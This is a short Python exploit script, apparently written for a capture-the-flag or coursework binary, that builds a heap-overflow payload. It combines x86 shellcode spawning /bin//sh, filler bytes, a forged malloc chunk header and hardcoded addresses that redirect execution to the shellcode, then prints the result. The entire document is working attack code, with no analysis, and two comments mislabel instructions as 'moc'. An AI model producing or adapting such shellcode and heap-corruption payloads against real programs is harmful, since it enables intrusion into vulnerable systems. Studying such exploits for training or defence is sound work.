# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
SHELLCODE = (
    b"\x31\xc0"  # xor eax, eax
    + b"\x50"  # push eax (null terminator)
    + b"\x04\x0b"  # add al, 11 (execve)
    + b"\x68//sh"  # push "//sh"
    + b"\x68/bin"  # push "/bin"
    + b"\x89\xe3"  # mov ebx, esp (ebx points to "/bin//sh")
    + b"\x31\xc9"  # moc ecx, ecx (argv = NULL)
    + b"\x31\xd2"  # moc edx, edx (envp = NULL)
    + b"\xcd\x80"  # int 0x80 (syscall)
)

ASTR_FILLER = b"A" * (100 - len(SHELLCODE))

AVAL_FILLER = b"B" * 4

# only 4 bytes instead of 8 because the previous chunk is used
MALLOC_HEADER = (
    b"\x0c\xa0\x04\x08"  # contains the address of a->_annotation (our shellcode)
)

BADD = b"\x74\xa0\x04\x08"  # contains the address of b's malloc header

EXPLOIT = SHELLCODE + ASTR_FILLER + AVAL_FILLER + MALLOC_HEADER + BADD

print(EXPLOIT)
